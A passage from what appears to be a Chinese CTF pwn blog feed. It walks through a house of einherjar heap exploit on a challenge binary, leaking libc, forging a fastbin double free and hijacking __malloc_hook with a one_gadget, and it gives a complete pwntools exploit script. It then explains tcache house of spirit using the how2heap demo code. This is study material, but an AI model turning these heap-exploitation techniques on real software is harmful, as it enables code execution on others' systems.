level_1_分析3</h2><ul><li>接下来我们就可以利用<code>ID2</code>这个堆块进行UAF漏洞，这样我们就可以通过堆风水构造<code>double free</code>，劫持<code>malloc_hook</code>和<code>realloc_hook</code></li><li>我们可以通过这些来计算偏移</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_addr = main_area - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_addr+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br></pre></td></tr></table></figure><ul><li>接下来我们就构造<code>double</code>，这时我们需要去<code>__malloc_hook</code>找可以伪造的堆块。我们需要这样的堆块，使得我们<code>double free</code>从而之后申请到这个地址的堆块，从而可以修改<code>__malloc_hook</code>、<code>realloc_hook</code>的地址，从而劫持<code>hook</code>指针为<code>onegadget</code>这样去<code>getshell</code>。（虽然这个地址的size并不是<code>0x70</code>、<code>0x71</code>，但是在<code>double free</code>的时候这个堆块也会被放入<code>fastbin</code>链表中）</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204112445476.png" alt="image-20250204112445476"></p><ul><li>接下来我们构造<code>double free</code>，我们现在就利用一个<code>ID2</code>去构造<code>UAF</code>，由于我们要劫持<code>hook</code>所要申请到的地址size位为<code>0x7f</code>，这样我们就要将其放入<code>0x70</code>的<code>fastbin</code>中。</li><li>所以我们先申请一个堆块ID10，大小为<code>0x68</code>，这样申请的堆块<code>size</code>才会为<code>0x70</code>。此时<code>chunk[10]</code>存储的堆地址与<code>chunk[2]</code>存储的堆地址是相同的。此时我们释放<code>chunk[10]</code>这个堆块，这样该堆块的就会被放入<code>fastbin</code>链表，该堆块的<code>fd</code>指针就会被启用，这时我们就使用<code>edit()</code>对<code>chunk[2]</code>修改，从而修改<code>fd</code>指针，使其指向<code> malloc_hook - 0x23</code></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204115300128.png" alt="image-20250204115300128"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204115323936.png" alt="image-20250204115323936"></p><ul><li>之后我们就先申请一个先申请一个<code>ID11</code>大小为<code>0x68</code>，然后我们再申请一个堆块<code>ID13</code>这样我们就可以将<code>malloc_hook-0x23</code>的这个堆块地址申请回来，然后我们可以修改<code>malloc_hook</code>为<code>realloc+16</code>、改<code>realloc_hook</code>为<code>ogg+6</code>。</li><li>此时我们的<code>ogg</code>为如下，这里我们<code>ogg+6</code>的原因是，当我们直接hook到<code>ogg</code>的时候<code>rcx</code>不是一个正常地址，会导致段错误，所以我就<code>ogg+6</code>直接不执行某个汇编代码，这样就不会出现段错误</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204115905883.png" alt="image-20250204115905883"></p><ul><li>之后我们再创建一个堆块，触发调用<code>malloc</code>，这样就可以触发<code>malloc_hook</code>,从而getshell</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204120113958.png" alt="image-20250204120113958"></p><h2 id="level_1_exp"><a class="markdownIt-Anchor" href="#level_1_exp"></a> level_1_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">ID,size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(ID).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">ID</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(ID).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">ID</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(ID).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">ID,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(ID).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">create(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">7</span>,<span class="number">0x20</span>)</span><br><span class="line">create(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">create(<span class="number">9</span>,<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f</span></span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;to show?Content:&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr-----&gt;&#x27;</span>,chunk_addr)</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">chunk_addr = chunk_addr - <span class="number">0x50</span></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># 溢出修改ID3</span></span><br><span class="line">chunk1_addr = chunk_addr + <span class="number">0x20</span>+<span class="number">0x30</span>+<span class="number">0x30</span>+<span class="number">0x50</span>+<span class="number">0x20</span></span><br><span class="line">chunk3_addr = chunk_addr + <span class="number">0x20</span>+<span class="number">0x30</span>+<span class="number">0x30</span>+<span class="number">0x50</span>+<span class="number">0x20</span>+<span class="number">0x120</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x120</span>)+p64(<span class="number">0x100</span>)<span class="comment">#+p64(chunk1_addr)+p64(chunk1_addr)</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment"># 溢出修改ID1</span></span><br><span class="line">create(<span class="number">5</span>,<span class="number">0x40</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x121</span>)+p64(chunk1_addr)+p64(chunk1_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;to show?Content: &#x27;</span>)</span><br><span class="line">main_area = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">main_area = <span class="built_in">int</span>.from_bytes(main_area,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_area---&gt;&#x27;</span>,<span class="built_in">hex</span>(main_area))</span><br><span class="line">libc_addr = main_area - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_addr+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">ogg = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">ogg = libc_addr + ogg[<span class="number">1</span>]+<span class="number">6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">create(<span class="number">10</span>,<span class="number">0x68</span>)</span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk))</span><br><span class="line">create(<span class="number">11</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#create(12,0xf0)</span></span><br><span class="line">create(<span class="number">13</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">13</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(ogg)+p64(realloc_hook+<span class="number">16</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">14</span>,<span class="number">20</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()                                        </span><br></pre></td></tr></table></figure><h1 id="house-of-einherjar_level_2"><a class="markdownIt-Anchor" href="#house-of-einherjar_level_2"></a> house of einherjar_level_2</h1><h2 id="level_2_分析1"><a class="markdownIt-Anchor" href="#level_2_分析1"></a> level_2_分析1</h2><h2 id="level_2_分析2"><a class="markdownIt-Anchor" href="#level_2_分析2"></a> level_2_分析2</h2><h2 id="level_2_分析3"><a class="markdownIt-Anchor" href="#level_2_分析3"></a> level_2_分析3</h2><h2 id="level_2_exp"><a class="markdownIt-Anchor" href="#level_2_exp"></a> level_2_exp</h2><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><ul><li>对于<code>house of einherjar</code>的这种堆利用方式，相同点就是触发堆块的<code>unlink</code>的向后合并，可以有以下几种思路：<ul><li>第一种就是像实验那样，<strong>在栈上伪造堆块</strong>，并且存在堆溢出，这样在堆合并后再次申请堆块就会申请到栈上，这样我们就可能可以修改栈上的返回地址，从而劫持程序的执行流。</li><li>第二种就是<strong>在堆块上的利用现有的堆</strong>通过堆溢出中<code>off-by-one</code>造成堆叠，然后通过堆风水和堆排布得到<code>double free</code>等漏洞，之后就可以申请任意地址，这样可能可以劫持<code>hook</code>、<code>got</code>表等地址。（例题：level1）</li></ul></li></ul>]]></content>
    
    
    <summary type="html">前言：继续学习堆</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house of spirit-2</title>
    <link href="http://iyheart.github.io/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/"/>
    <id>http://iyheart.github.io/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/</id>
    <published>2025-01-14T15:29:28.000Z</published>
    <updated>2025-01-24T13:22:39.654Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>熟悉了解<code>tcache_bin</code>的运行过程之后就可以开始学习<code>house of spirit</code>在<code>tcachebin</code>中的利用进行学习了</p></li><li><p>之前以及介绍过了<code>house of spirit</code>在<code>fastbin</code>中的利用，知道了<code>house of spirit</code>就是通过伪造堆块，将这个伪造的堆块通过<code>free</code>函数，链接到<code>fastbin</code>中。而本篇文章所介绍的是使用<code>house of spirit</code>将伪造的堆块链在<code>tcachebin</code>中。</p></li></ul><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li><p>在<code>glibc2.27</code>中比较之前的版本，在<code>free()</code>一个堆块后，如果该堆块放入的是<code>tcache</code>中，是没有做一些检查的。这时就可以对通过伪造一个堆块。然后修改<code>free(p)</code>中的指针<code>p</code>，使得指针<code>p</code>指向的是我们伪造的堆块地址。</p></li><li><p>这样我们就可以将伪造的堆块放入<code>tcache_bin</code>中，当我们下次使用<code>malloc()</code>函数申请适当的内存空间时，这个堆块就会被我们申请回来。这样我们就可以进行我们伪造的堆块，这一内存空间进行任意的写。如果是在栈上伪造堆块的话，</p></li><li><p>常见的伪造区域就是：在<code>栈</code>上伪造、<code>.bss</code>段上伪造堆块、在<code>malloc_hook</code>的位置伪造堆块</p></li><li><p>利用过程如图所示：</p></li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124164617495.png" alt="image-20250124164617495"></p><ul><li>伪造了一个<code>fake_chunk</code>，此时我们可以通过<code>溢出</code>或者<code>写入</code>，可以修改<code>free(ptr)</code>这个<code>ptr</code>的指针，使其指向我们伪造的堆块<code>fake_chunk</code></li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124164637586.png" alt="image-20250124164637586"></p><ul><li>之后我们调用<code>free(ptr)</code>，这样我们的<code>fake_chunk</code>就可以被放入<code>tcache_bin</code>，放入后的<code>tcache_bin</code>的结构图如下：</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124164911336.png" alt="image-20250124164911336"></p><ul><li>下次调用<code>malloc</code>函数时，申请适当大小的堆块，就可以将<code>fake_chunk</code>给申请回来，就可以向<code>fake_chunk</code>中写入数据。</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124165206165.png" alt="image-20250124165206165"></p><h1 id="伪造条件"><a class="markdownIt-Anchor" href="#伪造条件"></a> 伪造条件</h1><ul><li>对<code>prev_size</code>位的大小是任意的，因为<code>prev_size</code>要有效，就要<code>size</code>中的<code>p</code>位为<code>0</code>，这样才使得<code>prev_size</code>位有效，而在<code>tcache_bin</code>中是不关心<code>size</code>中的<code>p</code>位。</li><li>对于<code>size</code>位和<code>size</code>位中的三个标志位：<ul><li>对于<code>size</code>位，这个需要将该位的范围修改在<code>0x20</code>到<code>0x410</code>直接，这个<code>size</code>位必须与<code>0x10</code>对齐，<code>size</code>位一定要是我们下次能使用malloc申请的大小。</li><li>对与<code>P</code>位，<code>tcache_chunk</code>会忽略该位，此时该位可以<code>0</code>也可以<code>1</code>。</li><li>对于<code>M</code>位和<code>N</code>位（第2、第3标志位），这两个标志位一定要伪造成<code>0</code></li></ul></li><li>对于<code>prev_size</code>的起始地址，要满足<code>0x10</code>对齐。</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124175957370.png" alt="image-20250124175957370"></p><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>该实验代码是来自<code>how2heap</code>中<code>glibc2.27</code>的<code>tcache_house_of_spirit.c</code></li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>接下来翻译一下这段代码，顺便审一下代码。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个代码展示了house of spirit 在tcache中的攻击.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;它的利用方式和原来的house of spirit利用相似,但是你并不需要伪造一个将被释放的假堆块.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;你能在malloc.c的源码中看到，在函数_int_free中调用tcache_put时并没有检查next_chunk的size位和prev_inuse位是否合理.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(搜索字符串\&quot;invalid next size\&quot; 和 \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;现在来展示一个例子.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;先调用malloc()函数Calling malloc()防止之后释放的堆块合并入内存.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;让我们想象一下我们将覆盖1个指向伪造堆块区域的指针.\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//将被覆盖的指针</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//伪造堆块的区域</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个区域包含了一个伪造的堆块. 它的size位所在位置为 %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个堆块的size一定会落在tcache的范围(chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). PREV_INUSE(lsb)这一位会被tcache_chunks忽略, 然而IS_MMAPPED bits(second lsb)和NON_MAIN_ARENA (third lsb)会导致一些问题.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... 请注意这个位必须是之后将堆块使用malloc申请回来的大小,并且这个大小应该为malloc内部实现的大小(也就是0x10对齐在x64中,或者是在x86中0x8对齐),任何我们申请的非对齐的内存大小,都会在调用malloc时进位(即申请更大的一个能满足对齐的堆块). 例如,在x64下,0x30-0x38malloc都将会申请0x40大小的堆块,所以他们最后都会以malloc函数内部的参数运行. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;现在我们将覆盖我们的指针,将使用伪造堆块内部的的第二个假区域块地址(也就是第一个索引的地址)覆盖我们的指针,该堆块的地址为 %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... 注意这块关联的内存地址必须与16字节对齐.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;释放被覆盖的指针.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;现在下一个申请堆块将返回的堆块的区域是我们所伪造的堆块,位置如下 %p, 用户使用的区域为 %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="type">void</span> *b = <span 